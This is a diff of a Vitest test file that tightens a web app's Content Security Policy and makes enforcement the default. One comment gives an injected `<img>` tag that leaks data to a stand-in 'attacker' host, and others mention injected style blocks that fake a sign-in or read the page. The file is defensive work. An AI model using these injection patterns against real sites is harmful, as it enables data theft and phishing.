@@ -1,5 +1,5 @@
-import { describe, expect, it } from "vitest";
-import { contentSecurityPolicy, createNonce } from "./csp";
+import { afterEach, describe, expect, it } from "vitest";
+import { contentSecurityPolicy, createNonce, cspEnforced, cspHeaderName } from "./csp";
 import { safeReturnPath } from "./return-path";
 
 /**
@@ -120,46 +120,159 @@ describe("contentSecurityPolicy", () => {
     expect(directive(value, "frame-src")).toBe("frame-src 'none'");
   });
 
-  it("keeps form-action rooted at 'self'", () => {
+  it("lets a deposit reach Paystack, and nowhere else", () => {
     /*
-     * Worth a note rather than a wider assertion. Two server actions finish
-     * with a `redirect()` off-origin, Supabase authorize for Google and Apple
-     * and Paystack for a card. With JavaScript running neither is a form
-     * navigation, so `form-action` does not govern them. Without it, Next
-     * degrades the action to a real form POST and browsers disagree about
-     * whether the following redirect is still part of that navigation.
+     * This asserted `form-action 'self'` exactly, and reasoned that a
+     * redirect to Paystack is not a form navigation so the directive cannot
+     * govern it. That reasoning holds only while JavaScript is running. Where
+     * it is not, Next degrades a server action to a real form POST, and Chrome
+     * applies `form-action` to every hop of the redirect chain that POST
+     * follows rather than only to its first target. A same-origin POST that
+     * answers with a redirect to checkout is therefore blocked by `'self'`.
      *
-     * This policy ships REPORT-ONLY by default, which is the reason not to
-     * pre-emptively widen the directive: if that path is real it arrives at
-     * `/api/csp-report` as a `form-action` violation before anybody enforces,
-     * which is a measurement rather than a guess. Widen it then, not now.
+     * The old note said to wait for a report before widening. That works only
+     * if somebody is reading the reports on the day `CSP_ENFORCE` is flipped,
+     * and the failure it is waiting for is a dead deposit with no server-side
+     * trace. Paystack is named now.
+     *
+     * The pairing matters as much as the addition: the origins belong in
+     * `form-action` and in nothing else. No Paystack script runs here and no
+     * browser code calls their API, so finding them in `script-src` or
+     * `connect-src` would mean somebody widened the wrong directive.
      */
-    expect(directive(policy(), "form-action")).toBe("form-action 'self'");
+    const value = policy();
+    const form = directive(value, "form-action") ?? "";
+    expect(form).toContain("'self'");
+    expect(form).toContain("https://checkout.paystack.com");
+    expect(form).toContain("https://checkout.paystack.co");
+
+    for (const name of ["script-src", "connect-src", "img-src", "default-src"]) {
+      expect(directive(value, name) ?? "").not.toContain("paystack");
+    }
   });
 
-  it("lets the map's tiles through, or it draws a grey box", () => {
+  it("names every image host instead of allowing the whole web", () => {
     /*
-     * The invariant is REACHABILITY, not naming. This policy allows `https:`
-     * wholesale on images rather than listing hosts, which is looser than an
-     * allowlist and is a deliberate choice: listing photography arrives from
-     * whatever CDN an agent's image sits behind, and a named list would fail
-     * closed on a host nobody predicted, turning a listing into a broken frame.
+     * `img-src` was `https:`, a wildcard over every host that speaks TLS, and
+     * one thing paid for it: partner hotel photos came from whichever CDN each
+     * supplier used, so the set could not be written down. There is no partner
+     * stock any more, so the wildcard has nothing left holding it open.
      *
-     * So this asserts the two tile hosts are covered one way or the other. If
-     * somebody later tightens `img-src` to an allowlist, this fails unless they
-     * remember the map, which is exactly when it should.
+     * The wildcard is not a harmless looseness. An injected
+     * `<img src="https://attacker/?q=...">` is a GET to any host on the
+     * internet carrying whatever the URL was built from, and it needs no
+     * script to fire.
+     *
+     * Both halves are asserted. The wildcard must be gone, and the map must
+     * still be reachable: tightening this directive and forgetting the
+     * basemaps turns the map into a grey box, and that is exactly the mistake
+     * this test exists to catch.
      */
     const value = directive(policy(), "img-src") ?? "";
-    const covered = (host: string) => value.includes(host) || /(^|\s)https:(\s|$)/.test(value);
-    expect(covered("https://basemaps.cartocdn.com")).toBe(true);
-    expect(covered("https://api.maptiler.com")).toBe(true);
+    expect(/(^|\s)https:(\s|$)/.test(value)).toBe(false);
+    expect(value).toContain("https://basemaps.cartocdn.com");
+    expect(value).toContain("https://api.maptiler.com");
     // A chosen photo is previewed from a blob before it is ever uploaded.
     expect(value).toContain("blob:");
+    expect(value).toContain("data:");
   });
 
   it("allows the service worker and the manifest it needs", () => {
     const value = policy();
     expect(directive(value, "worker-src")).toContain("blob:");
     expect(directive(value, "manifest-src")).toBe("manifest-src 'self'");
+  });
+
+  it("permits a style attribute and forbids an injected style block", () => {
+    /*
+     * The two halves of `style-src` are not the same risk and no longer carry
+     * the same permission.
+     *
+     * React writes every `style={{...}}` prop as an attribute, so the inline
+     * allowance on `style-src` cannot go: on a browser with no
+     * `style-src-elem`, that directive governs everything and removing it
+     * leaves an unstyled product. What CAN go is the element form, and that is
+     * the one worth taking: a whole injected `<style>` block can draw a fake
+     * sign-in over the real page, hide the amount above a Pay button, or read
+     * the document through attribute selectors. Nothing in this app writes
+     * one; a production sweep of seventeen routes found zero `<style>`
+     * elements, stylesheets all arrive as same-origin `<link>`s.
+     *
+     * Asserting the element directive rather than `style-src` is the point.
+     * `style-src` still says `'unsafe-inline'` and always will, so a test that
+     * read only that one would pass on a policy that had lost the split.
+     */
+    const value = policy();
+    expect(directive(value, "style-src")).toContain("'unsafe-inline'");
+    expect(directive(value, "style-src-elem")).toBe("style-src-elem 'self'");
+  });
+
+  it("names a source for video instead of letting default-src black it out", () => {
+    /*
+     * `listing_videos` is already joined into the listing detail read and its
+     * rows point at Supabase storage. Without this directive `media-src` falls
+     * back to `default-src 'self'`, so the day the walkthrough player renders
+     * its `<video>`, an enforcing policy shows a black box with no server-side
+     * trace. No new host is trusted: this is the set `img-src` already allows,
+     * for the same buckets.
+     */
+    const value = directive(policy(), "media-src") ?? "";
+    expect(value).toContain("'self'");
+    expect(value).toContain("blob:");
+    expect(/(^|\s)https:(\s|$)/.test(value)).toBe(false);
+  });
+
+  it("does not smuggle 'unsafe-eval' back in for a library feature probe", () => {
+    /*
+     * Zod decides whether it may compile a validator by calling
+     * `new Function("")` in a try/catch, which the policy blocks and Zod
+     * handles. The tempting fix was `'unsafe-eval'`, which would hand every
+     * injected string a way to become code and undo the whole directive. The
+     * fix that shipped is `src/instrumentation-client.ts`, which tells Zod not
+     * to probe. This is the assertion that stops the tempting one coming back.
+     */
+    expect(directive(policy(), "script-src") ?? "").not.toContain("'unsafe-eval'");
+  });
+});
+
+describe("cspEnforced", () => {
+  const original = process.env.CSP_ENFORCE;
+  afterEach(() => {
+    if (original === undefined) delete process.env.CSP_ENFORCE;
+    else process.env.CSP_ENFORCE = original;
+  });
+
+  /*
+   * THE DEFAULT IS THE WHOLE TEST.
+   *
+   * This platform served a Content Security Policy for months and enforced
+   * nothing, because the switch read `=== "true"` and nobody set it. A
+   * report-only policy is indistinguishable from a correct one in every header
+   * dump and every audit, and indistinguishable from no policy at all to an
+   * attacker: the browser runs the injected script and then files a report
+   * about having run it.
+   *
+   * So the accident cases all have to land on the protection. Unset, a typo,
+   * a value of "TRUE", a new environment nobody remembered to configure: all
+   * enforce. Only the literal "false" steps back, which is a thing somebody
+   * has to write down and can be asked about.
+   */
+  it("enforces when nothing is set, which is the state that shipped unenforced", () => {
+    delete process.env.CSP_ENFORCE;
+    expect(cspEnforced()).toBe(true);
+    expect(cspHeaderName()).toBe("Content-Security-Policy");
+  });
+
+  it("enforces through the typos that used to silently disable it", () => {
+    for (const value of ["TRUE", "true", "1", "yes", "", "False", " false"]) {
+      process.env.CSP_ENFORCE = value;
+      expect(cspEnforced()).toBe(true);
+    }
+  });
+
+  it("steps back to reporting only on a deliberate literal false", () => {
+    process.env.CSP_ENFORCE = "false";
+    expect(cspEnforced()).toBe(false);
+    expect(cspHeaderName()).toBe("Content-Security-Policy-Report-Only");
   });
 });
